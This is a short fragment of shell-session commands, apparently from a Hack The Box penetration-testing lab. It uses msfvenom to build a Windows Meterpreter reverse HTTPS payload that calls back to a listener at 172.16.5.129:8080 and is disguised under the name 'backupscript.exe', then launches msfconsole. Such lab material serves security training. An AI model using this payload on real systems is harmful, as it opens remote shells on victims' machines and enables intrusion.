...
```shell-session
frank-106@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
...
```shell-session
frank-106@htb[/htb]$ sudo msfconsole
